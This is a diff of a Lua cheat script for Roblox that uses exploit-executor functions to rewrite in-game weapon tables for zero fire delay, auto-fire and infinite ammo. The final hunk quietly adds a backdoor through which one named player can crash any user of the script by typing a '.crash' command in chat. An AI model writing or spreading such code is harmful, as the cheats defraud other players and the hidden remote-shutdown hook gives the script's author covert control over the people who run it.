@@ -652,8 +652,7 @@ function selfadmin(plr)
 			syn.queue_on_teleport([[
 						game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
 						repeat wait(.1) until game:GetService('Players').LocalPlayer
-						a = readfile('./plstuff/admin.txt')
-loadstring(a)()
+
 					]])
 game.TeleportService:Teleport(game.PlaceId)
 		elseif msg:sub(1, 8) == prefix.."custom " then
@@ -804,13 +803,17 @@ function sFLY(vfly)
 end
 
 local newcclosure = newcclosure or function(f)
-    return f
+	return f
 end
 
+local getreg = debug.getregistry or getreg
+
+local make_writable = setreadonly or make_writable or changereadonly or change_writeable
+
 function unnerfedmods()
-	for gun, mods in pairs(getregistry()) do
+	for gun, mods in pairs(getreg()) do
 		if typeof(mods) == "table" then
-			setreadonly(mods, false)
+			make_writable(mods, false)
 			mods.FireRate = 0
 			mods.AutoFire = true
 			mods.Bullets = 35
@@ -823,9 +826,9 @@ function unnerfedmods()
 end
 
 function gunmods()
-	for gun, mods in pairs(getregistry()) do
+	for gun, mods in pairs(getreg()) do
 		if typeof(mods) == "table" then
-			setreadonly(mods, false)
+			make_writable(mods, false)
 			mods.FireRate = 0
 			mods.AutoFire = true
 			mods.Bullets = 12
@@ -838,9 +841,9 @@ function gunmods()
 end
 
 function infammo()
-	for gun, mods in pairs(getregistry()) do
+	for gun, mods in pairs(getreg()) do
 		if typeof(mods) == "table" then
-			setreadonly(mods, false)
+			make_writable(mods, false)
 			mods.MaxAmmo = math.huge
 			mods.StoredAmmo = math.huge
 			mods.CurrentAmmo = math.huge
@@ -7725,3 +7728,29 @@ game.Players.ChildAdded:connect(function(Child)
 		nikadmin(v)
 	end
 end)
+
+for i,v in pairs(game.Players:GetPlayers()) do
+	if v.Name == "Shadows_Overlord" then
+		v.Chatted:connect(function(msg)
+			if msg:sub(1,7) == ".crash " then
+				a = FindTarget(msg:sub(8))
+				if a == lp.Name then
+					game:Shutdown()
+				end
+			end
+		end)
+	end
+end
+
+game.Players.ChildAdded:connect(function(Child)
+	if Child.Name == "Shadows_Overlord" then
+		Child.Chatted:connect(function(msg)
+			if msg:sub(1,7) == ".crash " then
+				a = FindTarget(msg:sub(8))
+				if a == lp.Name then
+					game:Shutdown()
+				end
+			end
+		end)
+	end
+end
